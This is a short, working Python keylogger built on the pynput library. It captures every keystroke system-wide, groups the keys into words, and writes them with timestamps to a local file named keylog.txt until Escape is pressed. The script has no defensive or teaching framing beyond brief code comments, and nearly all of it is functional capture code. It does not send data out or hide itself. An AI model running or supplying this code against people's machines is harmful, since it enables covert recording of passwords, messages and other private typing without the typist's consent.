#!/usr/bin/env python3
# Import necessary libraries
from pynput.keyboard import Key, Listener
import logging

# Initialize Log File
logging.basicConfig(filename=("keylog.txt"), level=logging.INFO, format="%(asctime)s-%(message)s")
# Initialize Variable
word=''
# Whenever a key is pressed:
def on_press(key):
    global word

# If the key is a space or the enter key, log the word go to the next line
    if key == Key.space or key == Key.enter:
        word += ' '
        logging.info(str(word))
        # Resets the word variable
        word = ''
    # If the key pressed is a shift key, ignore it
    elif key == Key.shift_l or key == Key.shift_r:
        return
    # If backspace is pressed, remove the last character from the word variable
    elif key == Key.backspace:
        word = word[:-1]
    # Add the key pressed to the end of the word variable and remove the quotes around it for readability
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char
    # If the escape key pressed, stop the program
    if key == Key.esc:
        return False

# Calls on the on_press function and keeps it running
with Listener(on_press=on_press) as listener:
    listener.join()
